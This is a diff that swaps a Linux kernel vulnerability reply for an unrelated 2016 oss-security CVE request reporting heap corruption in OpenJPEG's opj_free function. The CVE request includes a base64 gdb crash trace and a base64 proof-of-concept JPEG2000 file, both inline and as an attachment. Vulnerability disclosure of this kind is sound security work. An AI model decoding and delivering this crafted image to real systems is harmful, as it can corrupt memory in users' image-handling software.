@@ -1,4 +1,9 @@
-Received: (qmail 18061 invoked by uid 550); 6 Jan 2025 18:19:21 -0000
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["7030" "Monday" "14" "March" "2016" "06:51:53" "+0000" "=?gb2312?B?d2luc29ubGl1KA==?==?gb2312?B?wfU=?==?gb2312?B?v8Yp?=" "winsonliu@tencent.com" "<1F2D4DA31CA62740BFF46830A0E6A4F7064F6978@EXMBX-TJ002.tencent.com>" "122" "[oss-security] CVE request - OpenJPEG : Heap Corruption in opj_free function" nil nil nil "3" "2016031406:51:53" "[oss-security] CVE request - OpenJPEG : Heap Corruption in opj_free function" (number mark "U       winsonliu@te Mar 14  122/7030  " thread-indent "\"[oss-security] CVE request - OpenJPEG : Heap Corruption in opj_free function\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0000
+X-Mozilla-Status2: 00000000
+Received: (qmail 3642 invoked by uid 550); 14 Mar 2016 12:03:31 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,81 +12,142 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-x-ms-reactions: disallow
-Received: (qmail 18036 invoked from network); 6 Jan 2025 18:19:20 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=kroah.com; h=cc
-	:content-type:content-type:date:date:from:from:in-reply-to
-	:in-reply-to:message-id:mime-version:references:reply-to:subject
-	:subject:to:to; s=fm2; t=1736187552; x=1736273952; bh=Ii380zx5+I
-	BFhDrIgNLinl5REKdb4nI3iEDVcJO5rH4=; b=mjtqgpmJP51Fz6n2xlVJTDdPEG
-	gT0Pb6ca50MYkWgaLqZ8atV58XjqAb2jradnKzdWFTDlqI7QgNNTepnjnJ4CepSV
-	KolXIFSIsF1bhFIuzcwsKhnVBKXHKFcVZ99agZhBarmf4cI+kST9MzNPey6baq/F
-	35UPgRLMac9EMyMnO0gIJjQrzz02Wb+SED7wVKpzcPsyHVd2Qn2nzouR+Zf/DSqV
-	iW2L3c5GbPmrnNv0DC0gjrZZug9tWtGj+jvNYsp0fb8ydUyQOswYCilBoXEAP17L
-	V9ZXA9yuDeoM3MBsuDie1chc6IcYhEtQZrmntc5Gh401cvCOACabR8lVJmNg==
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
-	messagingengine.com; h=cc:content-type:content-type:date:date
-	:feedback-id:feedback-id:from:from:in-reply-to:in-reply-to
-	:message-id:mime-version:references:reply-to:subject:subject:to
-	:to:x-me-proxy:x-me-sender:x-me-sender:x-sasl-enc; s=fm2; t=
-	1736187552; x=1736273952; bh=Ii380zx5+IBFhDrIgNLinl5REKdb4nI3iED
-	VcJO5rH4=; b=nEdE89Ax1Uwjt2QPf7+IKxClkOqXwGB2toqQ+5gCChu7C1X0dhD
-	125WYa0GWF73+Jz8BEGc+EpX5zih6zo2onTel8IQ6UQ2o12RXVDiGi8U7TY1aKuC
-	NpN92ZES7CV0cBzqHagRKqupc69pMx05rzU1ctd7yLCoNdED8Hzkfd77bEinVATo
-	7I/5jfY9oZNvb9BiwB25tT4/sZhK2V3lk6ppl723dYx8AmPQIrV1PfrgpSclUjBA
-	rGfSRa8p/QPC/snbD0Q628cVCpSx0jnCwtPTiXX1204DJJL4BgjRqYUo+y2zbXlJ
-	2SO97GczLIsud1c68EecKgDIWy3u5HzD68A==
-X-ME-Sender: <xms:nx58Z39HeXv2rUd2uag5VS-8XJFa1s2WFxnsNnG0lpy64zAEeRtn6A>
-    <xme:nx58Zzun6dthRosG2imRLgGOCFWSvV7nk_Bk4frsdCk3dU0C-5FjblXmMQIwMQTl7
-    FTwFhLHAIYtUw>
-X-ME-Received: <xmr:nx58Z1COf9pBNm5vyNqPBUsaSB-cGXGn9NorykO0c2wtYD6kHCW98L9_qlx-lbcJJJsYazzVbupahsnmYP8VEYpl6sgMVoIwWEwOnQ>
-X-ME-Proxy-Cause: gggruggvucftvghtrhhoucdtuddrgeefuddrudegtddguddutdcutefuodetggdotefrod
-    ftvfcurfhrohhfihhlvgemucfhrghsthforghilhdpggftfghnshhusghstghrihgsvgdp
-    uffrtefokffrpgfnqfghnecuuegrihhlohhuthemuceftddtnecunecujfgurhepfffhvf
-    fukfhfgggtuggjsehttdertddttddvnecuhfhrohhmpefirhgvghcumffjuceoghhrvghg
-    sehkrhhorghhrdgtohhmqeenucggtffrrghtthgvrhhnpefgteefffetvdffledtgeduud
-    etffdutdduveefvedtueegueeggfeiteehfeetfeenucffohhmrghinhepghhithhhuhgs
-    rdgtohhmnecuvehluhhsthgvrhfuihiivgeptdenucfrrghrrghmpehmrghilhhfrhhomh
-    epghhrvghgsehkrhhorghhrdgtohhmpdhnsggprhgtphhtthhopedvpdhmohguvgepshhm
-    thhpohhuthdprhgtphhtthhopehoshhsqdhsvggtuhhrihhthieslhhishhtshdrohhpvg
-    hnfigrlhhlrdgtohhm
-X-ME-Proxy: <xmx:nx58Zzfkzngg3AB_PUCT0q2THHb7cNg3IW_XCZN0q8_JvQ7EMagFow>
-    <xmx:nx58Z8NZGKKudfy3hWSZehwEJC6ja2vOr4LM_HM9JqsjH_1AgXPolg>
-    <xmx:nx58Z1kGrj_6RoKTPsf6WI7s-D6YrGGKcy4korFVJ-GYRTrPokMT-A>
-    <xmx:nx58Z2s7dvFBevn3Nv1obkSfP13u_WTl4L8mPTC9tLVGdMTMg1JrLw>
-    <xmx:oB58Z1a83dfUSy2632y3LuFKdduuusrCcSmLsnXBhzOX8So-S43xPEcg>
-Feedback-ID: i787e41f1:Fastmail
-Date: Mon, 6 Jan 2025 19:19:08 +0100
-From: Greg KH <greg@kroah.com>
-To: oss-security@lists.openwall.com
-Message-ID: <2025010626-unhearing-dealmaker-27de@gregkh>
-References: <ALcAqQAMIghdG5uEpB93rap6.1.1736154109674.Hmail.241270009@hdu.edu.cn>
+Received: (qmail 3505 invoked from network); 14 Mar 2016 06:52:09 -0000
+From: =?gb2312?B?d2luc29ubGl1KMH1v8Yp?= <winsonliu@tencent.com>
+To: oss-security <oss-security@lists.openwall.com>
+Thread-Topic: CVE request - OpenJPEG : Heap Corruption in opj_free function
+Thread-Index: AdF9uR0OjthtvJ2YScG7RMd5lohKfQ==
+Date: Mon, 14 Mar 2016 06:51:53 +0000
+Message-ID: <1F2D4DA31CA62740BFF46830A0E6A4F7064F6978@EXMBX-TJ002.tencent.com>
+Accept-Language: zh-CN, en-US
+Content-Language: zh-CN
+X-MS-Has-Attach: yes
+X-MS-TNEF-Correlator:
+x-originating-ip: [10.4.75.15]
+Content-Type: multipart/mixed;
+	boundary="_002_1F2D4DA31CA62740BFF46830A0E6A4F7064F6978EXMBXTJ002tence_"
 MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <ALcAqQAMIghdG5uEpB93rap6.1.1736154109674.Hmail.241270009@hdu.edu.cn>
-Subject: Re: [oss-security] Linux: general protection fault in __vmx_vcpu_run
- with nested virtualization
+Subject: [oss-security] CVE request - OpenJPEG : Heap Corruption in opj_free function
 
-On Mon, Jan 06, 2025 at 05:01:49PM +0800, Linfeng Sun wrote:
-> Hello list,
-> 
-> A bug has been detected in the Linux kernel's nested virtualization implementation, which 
-> can lead to a general protection fault in __vmx_vcpu_run when running a higher 
-> version L1 hypervisor kernel on an L0 host kernel version predating the following 
-> commit: https://github.com/torvalds/linux/commit/45779be5ced626db836e612e0dc638a1601abcf2
+--_002_1F2D4DA31CA62740BFF46830A0E6A4F7064F6978EXMBXTJ002tence_
+Content-Type: text/plain; charset="gb2312"
+Content-Transfer-Encoding: base64
 
-For those wanting to understand this, that means that any kernel version
-from release of:
-	3.17
-to the following releases:
-	4.9.331 4.14.296 4.19.262 5.4.220 5.10.150 5.15.75 5.19.17 6.0.3 6.1
-is vulnerable, and anything newer than that (i.e. any kernel newer than
-August of 2022) is just fine.
+SGkgYWxsLA0KDQpJIGZpbmQgYSB2dWxuZXJhYmlsaXR5IG9mIE9wZW5KUEVH
+LiBUaGUgc3BlY2lmaWMgZmxhdyBleGlzdHMgd2l0aGluIHRoZSBvcGpfZnJl
+ZSBmdW5jdGlvbi4gQSBzcGVjaWFsbHkgY3JhZnRlZCBKUEVHMjAwMCBpbWFn
+ZSBmaWxlIGNhbiBmb3JjZSBIZWFwIENvcnJ1cHRpb24gb2NjdXJyaW5nIGlu
+IE9wZW5KUEVHLiBUaGlzIGlzc3VlIGNhbiBiZSByZXByb2R1Y2VkIGluIHRo
+ZSBsYXRlc3QgdmVyc2lvbiBvZiBPcGVuSlBFRyAoaHR0cHM6Ly9naXRodWIu
+Y29tL3VjbG91dmFpbi9vcGVuanBlZyAyMDE2LjAzLjE0KS4NCg0KVGhlIGRl
+dGFpbGVkIGluZm9ybWF0aW9uIGFib3V0IHRoaXMgaXNzdWUgY2FuIGJlIGRl
+c2NyaWJlZCBhcyBmb2xsb3dzLg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tDQp3aW5zb25AdWJ1bnR1On4vRGVza3RvcC9yZXBvL29wZW5q
+cGVnL2JpbiQgZ2RiIG9wal9kZWNvbXByZXNzIC1xDQpSZWFkaW5nIHN5bWJv
+bHMgZnJvbSBvcGpfZGVjb21wcmVzcy4uLihubyBkZWJ1Z2dpbmcgc3ltYm9s
+cyBmb3VuZCkuLi5kb25lLg0KDQooZ2RiKSByIC1vIGltYWdlLnBnbSAtaSBo
+ZWFwX2NvcnJ1cHRpb24uanAyIA0KU3RhcnRpbmcgcHJvZ3JhbTogL2hvbWUv
+d2luc29uL0Rlc2t0b3AvcmVwby9vcGVuanBlZy9iaW4vb3BqX2RlY29tcHJl
+c3MgLW8gaW1hZ2UucGdtIC1pIGhlYXBfY29ycnVwdGlvbi5qcDINCg0KW0lO
+Rk9dIFN0YXJ0IHRvIHJlYWQgajJrIG1haW4gaGVhZGVyICgxMzEpLg0KW0lO
+Rk9dIE1haW4gaGVhZGVyIGhhcyBiZWVuIGNvcnJlY3RseSBkZWNvZGVkLg0K
+W0lORk9dIE5vIGRlY29kZWQgYXJlYSBwYXJhbWV0ZXJzLCBzZXQgdGhlIGRl
+Y29kZWQgYXJlYSB0byB0aGUgd2hvbGUgaW1hZ2UNCltXQVJOSU5HXSB0Z3Rf
+Y3JlYXRlIHRyZWUtPm51bW5vZGVzID09IDAsIG5vIHRyZWUgY3JlYXRlZC4N
+CltXQVJOSU5HXSBObyBpbmNsdHJlZSBjcmVhdGVkLg0KW1dBUk5JTkddIHRn
+dF9jcmVhdGUgdHJlZS0+bnVtbm9kZXMgPT0gMCwgbm8gdHJlZSBjcmVhdGVk
+Lg0KW1dBUk5JTkddIE5vIGltc2J0cmVlIGNyZWF0ZWQuDQpbV0FSTklOR10g
+dGd0X2NyZWF0ZSB0cmVlLT5udW1ub2RlcyA9PSAwLCBubyB0cmVlIGNyZWF0
+ZWQuDQpbV0FSTklOR10gTm8gaW5jbHRyZWUgY3JlYXRlZC4NCltXQVJOSU5H
+XSB0Z3RfY3JlYXRlIHRyZWUtPm51bW5vZGVzID09IDAsIG5vIHRyZWUgY3Jl
+YXRlZC4NCltXQVJOSU5HXSBObyBpbXNidHJlZSBjcmVhdGVkLg0KW1dBUk5J
+TkddIHRndF9jcmVhdGUgdHJlZS0+bnVtbm9kZXMgPT0gMCwgbm8gdHJlZSBj
+cmVhdGVkLg0KW1dBUk5JTkddIE5vIGluY2x0cmVlIGNyZWF0ZWQuDQpbV0FS
+TklOR10gdGd0X2NyZWF0ZSB0cmVlLT5udW1ub2RlcyA9PSAwLCBubyB0cmVl
+IGNyZWF0ZWQuDQpbV0FSTklOR10gTm8gaW1zYnRyZWUgY3JlYXRlZC4NCltX
+QVJOSU5HXSB0Z3RfY3JlYXRlIHRyZWUtPm51bW5vZGVzID09IDAsIG5vIHRy
+ZWUgY3JlYXRlZC4NCltXQVJOSU5HXSBObyBpbmNsdHJlZSBjcmVhdGVkLg0K
+W1dBUk5JTkddIHRndF9jcmVhdGUgdHJlZS0+bnVtbm9kZXMgPT0gMCwgbm8g
+dHJlZSBjcmVhdGVkLg0KW1dBUk5JTkddIE5vIGltc2J0cmVlIGNyZWF0ZWQu
+DQpbV0FSTklOR10gdGd0X2NyZWF0ZSB0cmVlLT5udW1ub2RlcyA9PSAwLCBu
+byB0cmVlIGNyZWF0ZWQuDQpbV0FSTklOR10gTm8gaW5jbHRyZWUgY3JlYXRl
+ZC4NCltXQVJOSU5HXSB0Z3RfY3JlYXRlIHRyZWUtPm51bW5vZGVzID09IDAs
+IG5vIHRyZWUgY3JlYXRlZC4NCltXQVJOSU5HXSBObyBpbXNidHJlZSBjcmVh
+dGVkLg0KW1dBUk5JTkddIHRndF9jcmVhdGUgdHJlZS0+bnVtbm9kZXMgPT0g
+MCwgbm8gdHJlZSBjcmVhdGVkLg0KW1dBUk5JTkddIE5vIGluY2x0cmVlIGNy
+ZWF0ZWQuDQpbV0FSTklOR10gdGd0X2NyZWF0ZSB0cmVlLT5udW1ub2RlcyA9
+PSAwLCBubyB0cmVlIGNyZWF0ZWQuDQpbV0FSTklOR10gTm8gaW1zYnRyZWUg
+Y3JlYXRlZC4NCltJTkZPXSBIZWFkZXIgb2YgdGlsZSAxIC8gMSBoYXMgYmVl
+biByZWFkLg0KW0lORk9dIFRpbGUgMS8xIGhhcyBiZWVuIGRlY29kZWQuDQpb
+SU5GT10gSW1hZ2UgZGF0YSBoYXMgYmVlbiB1cGRhdGVkIHdpdGggdGlsZSAx
+Lg0KDQpbSU5GT10gU3RyZWFtIHJlYWNoZWQgaXRzIGVuZCAhDQpXQVJOSU5H
+IC0+IFtQR00gZmlsZV0gT25seSB0aGUgZmlyc3QgY29tcG9uZW50DQogICAg
+ICAgICAgIGlzIHdyaXR0ZW4gdG8gdGhlIGZpbGUNCltJTkZPXSBHZW5lcmF0
+ZWQgT3V0ZmlsZSBpbWFnZS5wZ20NCioqKiBFcnJvciBpbiBgL2hvbWUvd2lu
+c29uL0Rlc2t0b3AvcmVwby9vcGVuanBlZy9iaW4vb3BqX2RlY29tcHJlc3Mn
+OiBkb3VibGUgZnJlZSBvciBjb3JydXB0aW9uICghcHJldik6IDB4MDgwZTdh
+ODAgKioqDQoNClByb2dyYW0gcmVjZWl2ZWQgc2lnbmFsIFNJR0FCUlQsIEFi
+b3J0ZWQuDQoweGI3ZmRjY2IwIGluID8/ICgpDQoNCihnZGIpIGJ0DQojMCAg
+MHhiN2ZkY2NiMCBpbiA/PyAoKQ0KIzEgIDB4YjdkZjkzM2EgaW4gbWFsbG9j
+X3ByaW50ZXJyIChhY3Rpb249PG9wdGltaXplZCBvdXQ+LCBzdHI9MHhiN2Vl
+YmZkMCAiZG91YmxlIGZyZWUgb3IgY29ycnVwdGlvbiAoIXByZXYpIiwgcHRy
+PTB4ODBlN2E4MCkgYXQgbWFsbG9jLmM6NDk5Ng0KIzIgIDB4YjdkZjlmYWQg
+aW4gX2ludF9mcmVlIChhdj0weGI3ZjMwNDIwIDxtYWluX2FyZW5hPiwgcD08
+b3B0aW1pemVkIG91dD4sIGhhdmVfbG9jaz0wKSBhdCBtYWxsb2MuYzozODQw
+DQojMyAgMHhiN2ZjODQ5YSBpbiBvcGpfZnJlZSAoKSBmcm9tIC9ob21lL3dp
+bnNvbi9EZXNrdG9wL3JlcG8vb3BlbmpwZWcvYmluL2xpYm9wZW5qcDIuc28u
+Nw0KIzQgIDB4YjdmOTgwOTYgaW4gb3BqX2ltYWdlX2Rlc3Ryb3kgKCkgZnJv
+bSAvaG9tZS93aW5zb24vRGVza3RvcC9yZXBvL29wZW5qcGVnL2Jpbi9saWJv
+cGVuanAyLnNvLjcNCiM1ICAweDA4MDRjYThlIGluIG1haW4gKCkNCg0KKGdk
+YikgeCAvaSAkZWlwDQo9PiAweGI3ZmRjY2IwOiBwb3AgICAgJWVicA0KDQoo
+Z2RiKSBpIHIgDQplYXggICAgICAgICAgICAweDAgMA0KZWN4ICAgICAgICAg
+ICAgMHgyZDVkIDExNjEzDQplZHggICAgICAgICAgICAweDYgNg0KZWJ4ICAg
+ICAgICAgICAgMHgyZDVkIDExNjEzDQplc3AgICAgICAgICAgICAweGJmZmY5
+Yjk0IDB4YmZmZjliOTQNCmVicCAgICAgICAgICAgIDB4YmZmZjllNTggMHhi
+ZmZmOWU1OA0KZXNpICAgICAgICAgICAgMHg3OCAxMjANCmVkaSAgICAgICAg
+ICAgIDB4YjdmMzAwMDAgLTEyMDg4MTE1MjANCmVpcCAgICAgICAgICAgIDB4
+YjdmZGNjYjAgMHhiN2ZkY2NiMA0KZWZsYWdzICAgICAgICAgMHgyNDYgWyBQ
+RiBaRiBJRiBdDQpjcyAgICAgICAgICAgICAweDczIDExNQ0Kc3MgICAgICAg
+ICAgICAgMHg3YiAxMjMNCmRzICAgICAgICAgICAgIDB4N2IgMTIzDQplcyAg
+ICAgICAgICAgICAweDdiIDEyMw0KZnMgICAgICAgICAgICAgMHgwIDANCmdz
+ICAgICAgICAgICAgIDB4MzMgNTENCg0KDQpUaGUgYXR0YWNobWVudCBpcyB0
+aGUgcHJvb2Ytb2YtY29uY2VwdCBmaWxlLg0KQWx0ZXJuYXRpdmVseSwgeW91
+IGNhbiBkZWNvZGUgdGhlIGZvbGxvd2luZyBzdHJpbmcgdXNpbmcgYmFzZTY0
+IGFuZCBzYXZlIHRoZSBkZWNvZGVkIGNvbnRlbnQgdG8gYSAuanAyIGZpbGUu
+DQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCkFBQUFER3BR
+SUNBTkNvY0tBQUFBRkdaMGVYQnFjRElnQUFBQUFHcHdNaUFBQUFCYmFuQXlh
+QUFBQUJacGFHUnlBQUFBSUFBQUFDQUENCkJQOEhBQUFBQUFBTVluQmpZd1FF
+QkFBQUFBQVBZMjlzY2dFQUFBQUFBQmdBQUFBaVkyUmxaZ0FFQUFBQUFBQUNB
+QUVBQUFBREFBSUENCkdRQURBQU1BQVFBQUFBQUJJMnB3TW1QL1QvOVJBRElB
+QUFBQUFDQUFBQUFnQUFBQUFBQUFBQUFBQUFBZ0FBQUFJQUFBQUFBQUFBQUEN
+CkFBUUVEd0VFQVFFRUFRRUFBUUgvVWdBTUFBQUFBUUVGQkFRQUFmOWNBQk5B
+S0RBd09EQXdPREF3T0RBd09EQXdPUDlrQUNVQUFVTnkNClpXRjBaV1FnWW5r
+Z1QzQmxia3BRUlVjZ2RtVnljMmx2YmlBeUxqRXVNUCtRQUFvQUFBQUFBSmtB
+QWYrVHdRZ0R6NEFRQ2NPQkE0Q2gNCjhBSUVwOFlJQnIrdnBCQUoxOGhBQTZQ
+akNBT1hwVSt2cENBTEhsSVBvZURBQ3pyWGdLUGtDZ0RQMVR4L3A4NGNBMy9k
+UnR3aWY2Zk8NCkhBTi8zVkR5ZkgrQW9mQ0tQbUtpcVM2ajVCSTlwalJaMlo0
+Tm9vYWo0eEE5cGpSWjJaNE52NENnNk1DZGxxajRHMStoOEk2ZHJDbEENCjlW
+ZldvZkNNbmF3cFFQbG5nUC9aDQoNCg0KQ1JFRElUOg0KVGhpcyB2dWxuZXJh
+YmlsaXR5IHdhcyBkaXNjb3ZlcmVkIGJ5IEtlIExpdSBvZiBUZW5jZW50J3Mg
+WHVhbnd1IExBQi4NCg==
 
-Hopefully everyone here is running a kernel newer than August of 2022,
-but hey, who knows!
+--_002_1F2D4DA31CA62740BFF46830A0E6A4F7064F6978EXMBXTJ002tence_
+Content-Type: application/octet-stream; name="heap_corruption.jp2"
+Content-Description: heap_corruption.jp2
+Content-Disposition: attachment; filename="heap_corruption.jp2"; size=414;
+	creation-date="Mon, 14 Mar 2016 06:51:52 GMT";
+	modification-date="Mon, 14 Mar 2016 06:51:52 GMT"
+Content-Transfer-Encoding: base64
 
-hope this helps,
+AAAADGpQICANCocKAAAAFGZ0eXBqcDIgAAAAAGpwMiAAAABbanAyaAAAABZp
+aGRyAAAAIAAAACAABP8HAAAAAAAMYnBjYwQEBAAAAAAPY29scgEAAAAAABgA
+AAAiY2RlZgAEAAAAAAACAAEAAAADAAIAGQADAAMAAQAAAAABI2pwMmP/T/9R
+ADIAAAAAACAAAAAgAAAAAAAAAAAAAAAgAAAAIAAAAAAAAAAAAAQEDwEEAQEE
+AQEAAQH/UgAMAAAAAQEFBAQAAf9cABNAKDAwODAwODAwODAwODAwOP9kACUA
+AUNyZWF0ZWQgYnkgT3BlbkpQRUcgdmVyc2lvbiAyLjEuMP+QAAoAAAAAAJkA
+Af+TwQgDz4AQCcOBA4Ch8AIEp8YIBr+vpBAJ18hAA6PjCAOXpU+vpCALHlIP
+oeDACzrXgKPkCgDP1Tx/p84cA3/dRtwif6fOHAN/3VDyfH+AofCKPmKiqS6j
+5BI9pjRZ2Z4Nooaj4xA9pjRZ2Z4Nv4Cg6MCdlqj4G1+h8I6drClA9VfWofCM
+nawpQPlngP/Z
 
-greg k-h
+--_002_1F2D4DA31CA62740BFF46830A0E6A4F7064F6978EXMBXTJ002tence_--
